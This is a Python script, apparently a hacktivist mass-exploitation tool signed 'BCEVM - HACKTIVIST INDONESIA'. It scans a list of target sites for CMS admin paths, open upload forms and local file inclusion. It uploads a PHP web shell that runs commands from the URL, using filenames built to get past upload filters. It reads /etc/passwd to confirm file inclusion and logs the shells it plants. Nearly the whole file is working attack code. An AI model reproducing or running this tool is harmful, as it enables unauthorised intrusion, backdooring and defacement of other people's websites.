import requests
import threading
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import random
import time
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# Config
THREADS = 10
MAX_RETRIES = 2
TIMEOUT = 10
deface_content = "<h1>Hacked by BCEVM - HACKTIVIST INDONESIA</h1>"
shell_code = "<?php echo 'Hacked by BCEVM - HACKTIVIST INDONESIA'; system($_GET['cmd']); ?>"
targets_file = "targets.txt"
success_file = "success.txt"
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

# Common CMS paths and vulnerabilities
CMS_PATTERNS = {
    'wordpress': [
        ('/wp-admin/', 'WordPress Admin'),
        ('/wp-content/plugins/', 'WordPress Plugins'),
        ('/xmlrpc.php', 'WordPress XML-RPC')
    ],
    'joomla': [
        ('/administrator/', 'Joomla Admin'),
        ('/index.php?option=com_', 'Joomla Component')
    ],
    'drupal': [
        ('/user/login', 'Drupal Login'),
        ('/admin/', 'Drupal Admin')
    ]
}

def get_random_agent():
    return random.choice(user_agents)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def check_upload_vulnerability(url):
    upload_paths = [
        'upload.php',
        'admin/upload.php',
        'filemanager/upload.php',
        'assets/upload.php',
        'inc/upload.php'
    ]

    for path in upload_paths:
        test_url = urljoin(url, path)
        try:
            r = requests.get(test_url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
            if r.status_code == 200 and ('upload' in r.text.lower() or 'file' in r.text.lower()):
                return test_url
        except:
            continue
    return None

def try_file_upload(upload_url):
    filenames = [
        "sayang.php",
        "sayang.php.jpg",
        "sayang.php;.jpg",
        "sayang.phtml",
        ".htaccess"
    ]

    for filename in filenames:
        try:
            files = {'file': (filename, shell_code, 'application/x-php')}
            r = requests.post(upload_url, files=files, timeout=TIMEOUT)

            if r.status_code in [200, 201]:
                uploaded_path = urljoin(upload_url, f"../uploads/{filename}")
                check = requests.get(uploaded_path, timeout=TIMEOUT)
                if check.status_code == 200:
                    return uploaded_path
        except:
            continue
    return None

def check_lfi_vulnerability(url):
    lfi_tests = [
        '../../../../../../../../etc/passwd',
        '....//....//....//....//....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ]

    for test in lfi_tests:
        try:
            test_url = f"{url}{'' if '?' in url else '?'}file={test}"
            r = requests.get(test_url, timeout=TIMEOUT)
            if 'root:x:0:' in r.text:
                return True
        except:
            continue
    return False

def check_cms_vulnerabilities(url):
    try:
        r = requests.get(url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
        content = r.text.lower()

        for cms, patterns in CMS_PATTERNS.items():
            if cms in content or any(p[0] in url.lower() for p in patterns):
                print(f"[+] Detected {cms.capitalize()} at {url}")

                # Check for specific vulnerabilities
                for path, desc in patterns:
                    vuln_url = urljoin(url, path)
                    try:
                        vr = requests.get(vuln_url, timeout=TIMEOUT)
                        if vr.status_code == 200:
                            print(f"  [+] Found {desc} at {vuln_url}")
                    except:
                        continue

                return cms
    except:
        pass
    return None

def scan_target(url):
    try:
        print(f"[*] Scanning {url}")

        # Check for CMS vulnerabilities first
        cms = check_cms_vulnerabilities(url)

        # Check for upload vulnerability
        upload_url = check_upload_vulnerability(url)
        if upload_url:
            print(f"[+] Found upload form at {upload_url}")
            shell_path = try_file_upload(upload_url)
            if shell_path:
                print(f"[SUCCESS] Shell uploaded: {shell_path}")
                with open(success_file, 'a') as f:
                    f.write(f"Shell: {shell_path}\n")
                return True

        # Check for LFI
        if check_lfi_vulnerability(url):
            print(f"[SUCCESS] LFI vulnerability found at {url}")
            with open(success_file, 'a') as f:
                f.write(f"LFI: {url}\n")
            return True

        print(f"[-] No vulnerabilities found at {url}")
        return False

    except Exception as e:
        print(f"[!] Error scanning {url}: {str(e)}")
        return False

def load_targets():
    if os.path.exists(targets_file):
        with open(targets_file, 'r') as f:
            return [line.strip() for line in f if line.strip() and is_valid_url(line.strip())]
    return []

def main():
    # Initialize files
    if not os.path.exists(targets_file):
        print("[-] No targets found in targets.txt, jalankan 'fofa_shodan_loader.py' dulu ya!")
        return

    if not os.path.exists(success_file):
        open(success_file, 'w').close()

    # Load existing targets
    targets = load_targets()
    if not targets:
        print("[-] targets.txt kosong, jalankan 'fofa_shodan_loader.py' dulu ya!")
        return

    print(f"[*] Starting scan with {len(targets)} targets")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(scan_target, url): url for url in targets}

        for future in as_completed(futures):
            url = futures[future]
            try:
                future.result()
            except Exception as e:
                print(f"[!] Exception in {url}: {str(e)}")

    print("[*] Scan completed. Check success.txt for results.")

if __name__ == "__main__":
    main()
